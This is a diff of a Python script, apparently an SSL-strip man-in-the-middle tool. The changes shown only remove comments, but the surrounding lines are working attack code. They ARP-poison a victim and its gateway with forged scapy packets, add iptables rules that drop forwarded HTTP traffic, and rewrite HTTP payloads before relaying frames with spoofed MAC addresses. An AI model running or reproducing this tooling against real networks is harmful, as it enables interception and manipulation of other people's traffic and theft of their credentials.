@@ -43,7 +43,6 @@ def get_mac(ip: str, iface: str, arp_db: Optional[dict[str, str]] = None) -> Opt
 def run_ssl_strip(config: SSLStripConfig) -> None:
     print(f"[*] Starting SSL Strip on {config.iface}")
     
-    # 1. Resolve MACs
     arp_db = load_arp_watcher_db()
     victim_mac = get_mac(config.victim_ip, config.iface, arp_db)
     gateway_mac = get_mac(config.gateway_ip, config.iface, arp_db)
@@ -53,9 +52,7 @@ def run_ssl_strip(config: SSLStripConfig) -> None:
         print("[-] MAC resolution failed. Terminating.")
         return
 
-    # 2. Start ARP Poisoning Threads
     def spoof_loop():
-        # Tell Victim I am Gateway; Tell Gateway I am Victim
         vic_pkt = scapy.Ether(dst=victim_mac)/scapy.ARP(op=2, pdst=config.victim_ip, psrc=config.gateway_ip)
         gw_pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=config.gateway_ip, psrc=config.victim_ip)
         while True:
@@ -64,8 +61,6 @@ def run_ssl_strip(config: SSLStripConfig) -> None:
             time.sleep(2)
 
     threading.Thread(target=spoof_loop, daemon=True).start()
-
-    # 3. AUTOMATED INTERCEPT (The fix for the freeze)
     start_intercept()
     
     try:
@@ -83,10 +78,8 @@ def run_ssl_strip(config: SSLStripConfig) -> None:
 
 def start_intercept() -> None:
     print("[*] Configuring iptables to block kernel-level forwarding...")
-    # Drop forwarded packets so the kernel doesn't forward them automatically
     os.system("iptables -A FORWARD -p tcp --dport 80 -j DROP")
     os.system("iptables -A FORWARD -p tcp --sport 80 -j DROP")
-    # Tell the kernel not to try and route these packets itself
     os.system("sysctl -w net.ipv4.ip_forward=0 > /dev/null")
 
 def stop_intercept() -> None:
@@ -97,13 +90,12 @@ def stop_intercept() -> None:
     sys.exit(0)
 
 def process_packet(pkt, config, victim_mac, gateway_mac, my_mac):
-    # 1. Ignore anything that isn't IP/Ethernet or is our own packet
     if not pkt.haslayer(scapy.IP) or not pkt.haslayer(scapy.Ether):
         return
     if pkt[scapy.Ether].src == my_mac:
         return
 
-    # 2. Determine destination
+    # destination
     if pkt[scapy.IP].src == config.victim_ip:
         target_mac = gateway_mac
     elif pkt[scapy.IP].src == config.gateway_ip:
@@ -111,7 +103,6 @@ def process_packet(pkt, config, victim_mac, gateway_mac, my_mac):
     else:
         return
 
-    # 3. Modify Payload if it's HTTP Data
     if pkt.haslayer(scapy.Raw):
         payload = pkt[scapy.Raw].load
         modified_payload = rewrite_http_payload(payload)
@@ -125,7 +116,6 @@ def process_packet(pkt, config, victim_mac, gateway_mac, my_mac):
             if pkt.haslayer(scapy.TCP):
                 del pkt[scapy.TCP].chksum
 
-    # 4. THE FIX: Prepare and send the packet
     # Change the MAC addresses to act as the middleman
     pkt[scapy.Ether].dst = target_mac
     pkt[scapy.Ether].src = my_mac
